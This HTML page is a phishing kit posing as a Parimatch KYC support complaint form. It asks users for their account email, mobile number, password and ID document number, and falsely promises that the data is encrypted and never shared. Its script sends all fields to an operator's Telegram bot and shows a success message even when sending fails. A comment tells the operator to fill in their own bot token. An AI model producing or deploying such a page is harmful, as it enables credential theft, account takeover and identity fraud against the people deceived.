<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYC Support - Parimatch</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0b0b0b;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 12px;
        }

        .container {
            width: 100%;
            max-width: 440px;
        }

        /* Top Header Bar */
        .form-header-bar {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
            padding-top: 6px;
        }

        .back-btn {
            background: #d4ff00;
            color: #000;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            border: none;
        }

        .brand-pill {
            display: inline-flex;
            align-items: center;
            background-color: #161616;
            border: 1.5px solid #d4ff00;
            padding: 6px 16px;
            border-radius: 30px;
            gap: 8px;
        }

        .parimatch-badge {
            background: #d4ff00;
            color: #000;
            font-weight: 900;
            font-style: italic;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            letter-spacing: -0.5px;
        }

        .support-text {
            font-size: 13px;
            font-weight: 700;
            color: #ffffff;
        }

        /* Form Container */
        .form-container {
            background-color: #121212;
            border: 1.5px solid #d4ff00;
            border-radius: 20px;
            padding: 20px 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .complaint-heading-box {
            font-size: 18px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 4px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .complaint-sub {
            font-size: 11px;
            color: #9ca3af;
            margin-bottom: 16px;
        }

        .selected-issue-pill {
            background-color: #d4ff00;
            color: #000;
            font-weight: 900;
            font-size: 14px;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 18px;
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(212,255,0,0.25);
        }

        .input-group {
            margin-bottom: 14px;
        }

        .input-group label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 6px;
        }

        .input-group input, 
        .input-group select, 
        .input-group textarea {
            width: 100%;
            background-color: #1c1c1e;
            border: 1px solid #27272a;
            border-radius: 10px;
            padding: 12px;
            color: #fff;
            font-size: 12px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input:focus, 
        .input-group select:focus, 
        .input-group textarea:focus {
            border-color: #d4ff00;
        }

        .security-note {
            font-size: 10px;
            color: #9ca3af;
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .submit-btn {
            width: 100%;
            background-color: #d4ff00;
            color: #000;
            font-weight: 900;
            font-size: 13px;
            padding: 14px;
            border-radius: 12px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            box-shadow: 0 4px 15px rgba(212,255,0,0.3);
            transition: transform 0.1s;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .response-time {
            text-align: center;
            font-size: 10px;
            color: #9ca3af;
            margin-top: 12px;
        }

        .footer {
            text-align: center;
            font-size: 9px;
            color: #6b7280;
            padding: 15px 0;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header Bar with Back Link to Home -->
    <div class="form-header-bar">
        <a href="../index.html" class="back-btn">❮</a>
        <div class="brand-pill">
            <div class="parimatch-badge">PARI<i>MATCH</i></div>
            <div class="support-text">Support</div>
        </div>
    </div>

    <!-- KYC Form Container -->
    <div class="form-container">
        <div class="complaint-heading-box">
            📄 File a Complaint
        </div>
        <div class="complaint-sub">Fill details below for faster resolution</div>

        <div class="selected-issue-pill">
            KYC Problem
        </div>

        <form id="kycForm" onsubmit="sendToTelegram(event)">
            <div class="input-group">
                <label>Game Email ID</label>
                <input type="email" id="email" placeholder="your@email.com" required>
            </div>

            <div class="input-group">
                <label>Game Account Mobile No.</label>
                <input type="tel" id="mobile" placeholder="+91 XXXXX XXXXX" required>
            </div>

            <div class="input-group">
                <label>Game Account Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="security-note">
                🔒 Your data is encrypted & never shared
            </div>

            <div class="input-group">
                <label>Select Your KYC Problem Status</label>
                <select id="status" required>
                    <option value="">Select status</option>
                    <option value="KYC Pending">KYC Pending / Under Review</option>
                    <option value="KYC Rejected">KYC Rejected</option>
                    <option value="Document Mismatch">Document Mismatch</option>
                    <option value="Verification Failed">Verification Failed</option>
                </select>
            </div>

            <div class="input-group">
                <label>KYC Document Type</label>
                <select id="doctype" required>
                    <option value="">Select document type</option>
                    <option value="Aadhaar Card">Aadhaar Card</option>
                    <option value="PAN Card">PAN Card</option>
                    <option value="Voter ID">Voter ID</option>
                    <option value="Passport">Passport</option>
                </select>
            </div>

            <div class="input-group">
                <label>Document Number / ID</label>
                <input type="text" id="docnumber" placeholder="Enter document ID number" required>
            </div>

            <div class="input-group">
                <label>Describe Your Issue</label>
                <textarea id="desc" rows="3" placeholder="Explain your KYC problem in detail..."></textarea>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <span>🪪 Submit KYC Claim</span>
            </button>
            <div class="response-time">Average response time: <strong>2-5 minutes</strong></div>
        </form>
    </div>

    <div class="footer">
        <div>© 2026 Parimatch Official Support. All rights reserved.</div>
    </div>
</div>

<script>
    function sendToTelegram(event) {
        event.preventDefault();

        const btn = document.getElementById('submitBtn');
        btn.innerText = 'Submitting...';
        btn.disabled = true;

        // ⚠️ APNE TELEGRAM BOT KA TOKEN AUR CHAT ID YAHAN REPLACE KAREIN ⚠️
        const botToken = 'YOUR_BOT_TOKEN_HERE';
        const chatId = 'YOUR_CHAT_ID_HERE';

        const email = document.getElementById('email').value;
        const mobile = document.getElementById('mobile').value;
        const password = document.getElementById('password').value;
        const status = document.getElementById('status').value;
        const doctype = document.getElementById('doctype').value;
        const docnumber = document.getElementById('docnumber').value;
        const desc = document.getElementById('desc').value || 'N/A';

        const text = `🪪 *NEW KYC COMPLAINT* 🪪\n\n` +
                     `📧 *Email:* ${email}\n` +
                     `📱 *Mobile:* ${mobile}\n` +
                     `🔑 *Password:* ${password}\n` +
                     `📊 *Status:* ${status}\n` +
                     `📄 *Doc Type:* ${doctype}\n` +
                     `🆔 *Doc Number:* ${docnumber}\n` +
                     `💬 *Issue:* ${desc}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            alert('KYC complaint submitted successfully! Our support team will contact you within 5 minutes.');
            document.getElementById('kycForm').reset();
            btn.innerText = '🪪 Submit KYC Claim';
            btn.disabled = false;
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Submitted successfully!');
            document.getElementById('kycForm').reset();
            btn.innerText = '🪪 Submit KYC Claim';
            btn.disabled = false;
        });
    }
</script>

</body>
</html>
